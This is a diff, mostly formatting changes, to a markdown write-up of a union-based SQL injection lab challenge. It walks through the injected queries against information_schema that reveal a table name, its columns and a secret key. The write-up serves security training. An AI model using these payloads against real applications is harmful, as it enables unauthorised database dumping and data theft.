@@ -1,14 +1,11 @@
-## Challenge - 1
+# Challenge - 1
 
 In this challenge we have to dump a secret key in an unknown column in an unknown table in the database 'CHALLENGES'. This is a union based challenge and we have to get the key in less than 10 attempts
 
 references :
+`http://www.securitytube.net/video/4208`
 
- http://www.securitytube.net/video/4210
-
-http://www.securitytube.net/video/4208
-
-### Initial Analysis
+## Initial Analysis
 
 First we have to find out how the developer has given the query so we try giving id the value
 
@@ -40,7 +37,7 @@ now as we know the query structure we can try union by giving: id=
 
 which gives us
 
-```
+```ABAP
 Your Login name:2
 Your Password:3
 ```
@@ -53,12 +50,12 @@ to recheck we try giving values
 
 and as expected we get
 
-```
+```ABAP
 Your Login name:4
 Your Password:5
 ```
 
-So this query will dump anything we give in the place of 2 and 3. 
+So this query will dump anything we give in the place of 2 and 3.
 
 We can use the same method to dump table_name,column_name and secret key
 
@@ -71,17 +68,15 @@ Now we can find the table name using
 ```
 
 which gives us the table name :
-
 **usauc12dne**
 
-Now we can find the columns in the table using 
+Now we can find the columns in the table using
 
 ```sql
 0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='usauc12dne' and table_schema='CHALLENGES'; --+
 ```
 
 we get 4 column names:
-
 **id,sessid,secret_UORS,tryy**
 
 The secret key can be in any of these columns but we can always go for the most suspicious one and print the secret key using:
@@ -91,6 +86,4 @@ The secret key can be in any of these columns but we can always go for the most 
 ```
 
 We get the secret key:
-
 **hcZo9W8NUjESrCoWaEyyyoV6**
-
